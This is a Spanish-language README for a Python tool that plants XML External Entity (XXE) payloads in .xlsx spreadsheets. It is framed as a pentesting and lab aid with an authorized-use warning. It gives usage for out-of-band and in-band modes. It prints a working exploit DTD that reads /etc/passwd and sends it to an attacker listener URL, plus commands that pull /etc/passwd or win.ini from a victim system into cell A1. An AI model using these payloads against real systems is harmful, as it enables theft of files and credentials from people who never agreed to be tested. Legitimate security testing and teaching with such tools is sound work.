Inyector XXE para Archivos XLSX
===============================

Esta es una herramienta de línea de comandos escrita en Python para inyectar payloads de XXE (XML External Entity) en archivos `.xlsx`. Su propósito es facilitar la experimentación y la demostración de vulnerabilidades XXE en entornos controlados de pentesting y laboratorios de seguridad.

**ADVERTENCIA:** Esta herramienta está diseñada exclusivamente para fines educativos y para ser utilizada en sistemas donde se tenga autorización explícita. El uso no autorizado de esta herramienta contra sistemas ajenos es ilegal.

✨ Características
-----------------

-   **Dos Modos de Ataque:**

    -   `oob` (Out-of-Band): Ideal para detectar la vulnerabilidad y exfiltrar datos a un servidor externo.

    -   `inband`: Muestra el contenido de un archivo local directamente en una celda del archivo Excel.

-   **Flexibilidad en OOB:** Permite elegir en qué archivo XML interno del `.xlsx` se inyectará el payload (ej. `workbook.xml`, `sheet1.xml`, etc.).

-   **Respeto por el Contenido:** En el modo `inband`, el script modifica el archivo original de forma quirúrgica para preservar el resto del contenido, sobrescribiendo únicamente la celda A1.

-   **Interfaz Clara:** Mensajes de color y una ayuda detallada para un uso sencillo e intuitivo.

🚀 Instalación y Requisitos
---------------------------

Solo necesitas **Python 3**. No se requieren librerías externas.

1.  **Clona o descarga el script:**

    ```
    git clone [[URL_DEL_REPOSITORIO]](https://github.com/arthusu/xxe_injector_xlsx.git)
    cd xxe_injector_xlsx

    ```

    O simplemente guarda el archivo `xxe_injector.py` en tu máquina.

2.  **¡Listo!** Ya puedes usar el script.

🛠️ Uso
-------

La estructura básica del comando es la siguiente:

```
python3 xxe_injector.py -i <archivo_entrada.xlsx> -o <archivo_salida.xlsx> [opciones]

```

### Argumentos

| **Argumento** | **Descripción** | **Requerido** |
| --- | --- | --- |
| `-i`, `--input` | El archivo `.xlsx` original que se usará como base. | **Sí** |
| `-o`, `--output` | El nombre del nuevo archivo `.xlsx` que contendrá el payload. | **Sí** |
| `-m`, `--mode` | El modo de ataque. Opciones: `oob` (defecto) o `inband`. | No |
| `-H`, `--host` | Tu dirección IP o dominio donde escucharás las conexiones. | **Sí** (solo para modo `oob`) |
| `-f`, `--file` | La ruta absoluta al archivo que quieres leer en el sistema víctima (ej. `/etc/passwd`). | **Sí** (solo para modo `inband` o exfiltración `oob`) |
| `-t`, `--target` | [Solo modo `oob`] Elige el archivo XML interno a modificar usando un número (ver ayuda para la lista). | No (defecto: 1, `xl/workbook.xml`) |


💡 Ejemplos Prácticos
---------------------

### 1\. Detección Simple (Out-of-Band)

Este es el caso de uso más simple para confirmar si un sistema es vulnerable.

**Paso 1: Inicia un listener en tu máquina.**

```
# Escucha en el puerto 8000
python3 -m http.server 8000

```

**Paso 2: Ejecuta el script.**

```
python3 xxe_injector.py -i entrada.xlsx -o salida_oob.xlsx -H tu-ip:8000

```

Si al procesar `salida_oob.xlsx` recibes una conexión en tu listener pidiendo `/pwn.dtd`, ¡el sistema es vulnerable!

### 2\. Exfiltración de Archivos (Out-of-Band)

Para leer un archivo y enviar su contenido a tu servidor.

**Paso 1: Crea el archivo `exploit.dtd` en tu máquina.** Con el siguiente contenido:

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#37; send SYSTEM 'http://tu-ip:8000/?content=%file;'>">
%exfil;
%send;

```

*Reemplaza `/etc/passwd` por el archivo que quieras leer y `tu-ip:8000` por tu listener.*

**Paso 2: Inicia tu listener en la misma carpeta donde guardaste `exploit.dtd`.**

```
python3 -m http.server 8000

```

**Paso 3: Ejecuta el script.**

```
python3 xxe_injector.py -i entrada.xlsx -o salida_exfil_oob.xlsx -H tu-ip:8000 -f /etc/passwd

```

Cuando el sistema vulnerable procese el archivo, verás una petición en tu listener que contiene el contenido de `/etc/passwd` en la URL.

### 3\. Exfiltración de Archivos (In-Band)

Para que el contenido de un archivo aparezca directamente en la celda A1.

**Ejecuta el script:**

```
# Para un sistema Linux/macOS
python3 xxe_injector.py -i entrada.xlsx -o salida_inband.xlsx -m inband -f /etc/passwd

# Para un sistema Windows
python3 xxe_injector.py -i entrada.xlsx -o salida_inband.xlsx -m inband -f "c:/windows/win.ini"

```

Abre el archivo `salida_inband.xlsx` en una aplicación vulnerable. El contenido del archivo especificado debería aparecer en la celda A1.
